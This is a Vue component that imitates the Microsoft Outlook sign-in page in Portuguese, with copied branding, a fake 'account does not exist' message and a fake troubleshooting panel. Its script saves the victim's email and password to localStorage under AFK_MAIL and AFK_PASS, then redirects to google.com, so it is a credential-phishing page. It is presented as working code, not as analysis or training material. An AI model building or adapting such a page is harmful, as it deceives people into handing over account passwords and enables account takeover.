<template>
    <div class="app-box">
        <div class="app-container">
            <div class="app-header">
                <img class="app-header-icon" src="../../public/assets/img/Outlook.png" alt="presentation">
            </div>
            <div class="app-content">
                <div class="app-content-icon">
                    <img class="app-content-fig" src="../../public/assets/img/Icon.svg" alt="presentation">
                </div>
                <div v-show="true" class="app-content-mail">
                    <div class="app-content-mail-top">
                        <h4 class="app-content-mail-title">Entrar</h4>
                        <h4 class="app-content-mail-sub-title">Continuar para Outlook</h4>
                    </div>
                    <div class="app-content-mail-center">
                        <span class="app-content-mail-input-fail">Essa conta Microsoft não existe. Insira uma conta diferente ou <a href="https://signup.live.com/" class="app-content-mail-input-span"> obtenha uma nova</a>.</span>
                        <input type="email" name="email" id="email" @keydown="MailEndPoint" v-model="mail" value="" placeholder="Email, Telefone ou Skype" autocomplete="off" required>
                        <h4 class="app-content-mail-input">Não tem uma conta? <a href="https://signup.live.com/" class="app-content-mail-input-span">Crie uma!</a></h4>
                    </div>
                    <div class="app-content-mail-bottom">
                        <button type="submit" @click="PointEndMail" class="app-content-mail-btn">Avançar</button>
                    </div>
                </div>
                <div v-bind:class="{'app-content-pass' : false , 'app-content-pass-hover' : true}">
                    <div class="app-content-pass-box-top">
                        <div @click="ForMail" class="app-content-pass-box-top-circle">
                            <i class="fa-thin fa-arrow-left app-content-pass-box-top-circle-icon"></i>
                        </div>
                        <h6 class="app-content-pass-box-top-mail">{{mail}}</h6>
                    </div>
                    <div class="app-content-pass-box-center">
                        <h6 class="app-content-pass-box-center-text">Insira a senha</h6>
                        <input @keydown="PassPointEnd" type="pass" name="pass" id="pass" value placeholder="Senha" required autocomplete="off">
                        <h6 class="app-content-pass-box-center-sub-text">Esqueceu a senha?</h6>
                        <h6 class="app-content-pass-box-center-sub-text">Outras maneiras de entrar</h6>
                    </div>
                    <div class="app-content-pass-box-bottom">
                        <button @click="PassEndPoint" type="submit" class="app-content-pass-box-bottom-btn">Entrar</button>
                    </div>
                </div>
            </div>
            <div class="app-down">
                <i class="fa-light fa-key app-down-icon"></i>
                <h6 class="app-down-text">Opções de entrada</h6>
            </div>
            <div class="app-down-info" data-info="true">
                <div class="app-down-info-top">
                    <h6 class="app-down-info-top-text">Detalhes da solução de problemas</h6>
                    <i @click="AppInfoX" class="fa-sharp fa-thin fa-xmark app-down-info-top-icon"></i>
                </div>
                <div class="app-down-info-center">
                    <h6 class="app-down-info-center-text">Se você entrar em contato com o administrador, envie estas informações para ele.</h6>
                    <div class="app-down-info-center-box">
                        <h6 class="app-down-info-top-center-box-text">Copiar informações para a área de transferência</h6>
                        <i class="fa-sharp fa-thin fa-circle-check app-down-info-top-center-box-icon"></i>
                        <h6 class="app-down-info-top-center-box-text-sub">Copiado</h6>
                    </div>
                </div>
                <div class="app-down-info-bottom">
                    <h6 class="app-down-info-bottom-text">Correlation Id: <span class="app-down-info-hash-text">f43ef{{ AFK_KEY }}b1f2</span></h6>
                    <h6 class="app-down-info-bottom-text">Timestamp: <span class="app-down-info-hash-text">{{Dates}}</span></h6>
                </div>
            </div>
        </div>
    </div>
</template>
<script >
export default {
    data() {
        return {
            mail: '',
            AFK_KEY: window.localStorage.getItem("AFK_KEY"),
            Dates: new Date(Date.now())
        }
    },
}
</script>
<script setup>
function PassEndPoint() {
    const pass = document.querySelector("#pass");
    window.localStorage.setItem("AFK_PASS", pass.value);
    window.location.href  = "http://google.com"
}
function MailEndPoint(e) {
    const mail = document.querySelector("#email");
    if(e.key.length==1){
        const Regex = new RegExp(/^[a-zA-Z-0-9]+$/g).test(e.key[0]);
        if (Regex) {
            mail.setAttribute("value", mail.value + e.key);
        }
    } else if (e.key === "Backspace") {
        mail.setAttribute("value", mail.value.slice(0, -1))
    }
}
function PointEndMail(e) {
    const mail = document.querySelector("#email");
    const failMail = document.querySelector(".app-content-mail-input-fail");
    const passMail = document.querySelector(".app-content-pass-hover");
    const mailConfig = document.querySelector(".app-content-mail");
    const Regex = new RegExp(/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/).test(mail.value);
    if (Regex) {
        window.localStorage.setItem("AFK_MAIL", mail.value);
        passMail.setAttribute("class", "app-content-pass");
        mailConfig.setAttribute("style", "display: none");
        failMail.setAttribute("style", "display: none");
    } else {
        failMail.setAttribute("style", "display: block");
    }
}
function AppInfoX() {
    const appInfo = document.querySelector(".app-down-info");
    if (appInfo) {
        appInfo.classList.toggle("app-down-info-show");
    } else {
        appInfo.classList.toggle("app-down-info");
        
    }
}
function ForMail() {
    const MailConfig = document.querySelector(".app-content-mail");
    const PassConfig = document.querySelector(".app-content-pass");
    const InputPass = document.querySelector("#pass");
    if (PassConfig) {
        PassConfig.setAttribute("class", "app-content-pass-hover");
        MailConfig.setAttribute("style", "display: flex");
        InputPass.value = "";
    }
}
function PassPointEnd(e) {
    const pass = document.querySelector("#pass");
    if (e.key.length == 1) {
        pass.setAttribute("value", pass.value + e.key);
    } else if (e.key === "Backspace") {
        pass.setAttribute("value", pass.value.slice(0, -1))
    }
}
</script>
<style scoped>
@import url("../../public/assets/css/main.css");
</style>